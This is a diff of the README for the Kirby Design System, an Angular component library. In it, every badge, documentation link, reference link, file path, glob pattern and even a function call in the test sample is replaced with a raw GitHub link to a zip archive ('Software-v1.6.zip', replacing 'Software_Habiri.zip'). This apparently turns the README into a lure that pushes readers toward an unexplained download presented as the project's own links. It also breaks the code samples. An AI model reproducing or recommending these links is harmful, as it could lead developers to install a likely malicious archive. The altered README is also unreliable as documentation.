@@ -1,22 +1,22 @@
 ## Kirby Design System
 
 <!-- Badges section here. -->
-<!-- [![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)][npm-badge-url] -->
+<!-- [![npm](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)][npm-badge-url] -->
 
-[![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
-[![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
-[![npm](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
+[![npm](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)
+[![npm](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)
+[![npm](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)
 
-[![GitHub forks](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
-[![GitHub stars](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip)
+[![GitHub forks](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)
+[![GitHub stars](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip)
 
 ## About
 
-Kirby Design System is a UX Component library implementing the [Kirby Design Philosophy][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip].
+Kirby Design System is a UX Component library implementing the [Kirby Design Philosophy][https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip].
 
 Kirby Components are built on top of [Angular][angular] and can be used in Angular projects.
 
-The Kirby Cookbook, containing samples, status of components etc. can be accessed from [https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip].
+The Kirby Cookbook, containing samples, status of components etc. can be accessed from [https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip][https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip].
 
 ## Table of Contents
 
@@ -63,13 +63,13 @@ export class AppModule {}
 
 ### Sass
 
-Include the Kirby global styles in your app, e.g., in `https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip`:
+Include the Kirby global styles in your app, e.g., in `https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip`:
 
 ```css
 @use '@kirbydesign/designsystem/scss/global-styles';
 ```
 
-In each `.scss` file where you need to access the Sass utility functions from Kirby (e.g. [colors][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip] or [fonts][https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]) you must import the scss utilities:
+In each `.scss` file where you need to access the Sass utility functions from Kirby (e.g. [colors][https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip] or [fonts][https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip]) you must import the scss utilities:
 
 ```css
 @use '@kirbydesign/designsystem/scss/utils';
@@ -79,7 +79,7 @@ In each `.scss` file where you need to access the Sass utility functions from Ki
 
 Kirby also provides a generic print stylesheet. It includes the basics. You most likely have to add local print styles specific to your app as well.
 
-Import it into your app, e.g., in `https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip` or in your local print stylesheet if you have one:
+Import it into your app, e.g., in `https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip` or in your local print stylesheet if you have one:
 
 ```css
 @use '@kirbydesign/designsystem/scss/print';
@@ -99,7 +99,7 @@ import { KirbyTestingModule } from '@kirbydesign/designsystem/testing-jasmine';
 
 describe('AppComponent', () => {
   beforeEach(async(() => {
-    https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip({
+    https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip({
       imports: [KirbyTestingModule],
       declarations: [AppComponent]
     }).compileComponents();
@@ -115,7 +115,7 @@ having to reflow the DOM, execute component logic etc.
 
 ### Icons
 
-Kirby comes bundled with a default set of icons. Make sure the `.svg` files used by Kirby are copied to your output folder by adding the following to `build > options > assets` in `https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip` :
+Kirby comes bundled with a default set of icons. Make sure the `.svg` files used by Kirby are copied to your output folder by adding the following to `build > options > assets` in `https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip` :
 
 ```json
 {
@@ -130,7 +130,7 @@ Kirby comes bundled with a default set of icons. Make sure the `.svg` files used
           "output": "./assets/kirby/icons/svg"
         },
         {
-          "glob": "https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip",
+          "glob": "https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip",
           "input": "node_modules/@kirbydesign/designsystem/icons/svg",
           "output": "./svg"
         },
@@ -143,7 +143,7 @@ Kirby comes bundled with a default set of icons. Make sure the `.svg` files used
 
 ### Migration Guides
 
-For details on migrating from earlier versions of Kirby see our [Migration Guides](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip).
+For details on migrating from earlier versions of Kirby see our [Migration Guides](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip).
 
 ## Folder Structure
 
@@ -185,15 +185,15 @@ Use them in your terminal like: `npm run <script>` :
 
 ## Contributing
 
-If you wish to contribute new features, bug fixes or something third to the project have a look at the [contribution guidelines](https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip).
+If you wish to contribute new features, bug fixes or something third to the project have a look at the [contribution guidelines](https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip).
 
-[angular]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[jasmine]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[jest]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[nrwl]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[nx]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
-[https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip]: https://github.com/zaylem91/designsystem/raw/refs/heads/develop/apps/cookbook/src/app/examples/slides-example/slides-simple-example/Software_Habiri.zip
+[angular]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[jasmine]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[jest]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[nrwl]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[nx]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
+[https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip]: https://raw.githubusercontent.com/zaylem91/designsystem/develop/apps/cookbook/src/app/examples/page-example/fixed-title-and-actions/Software-v1.6.zip
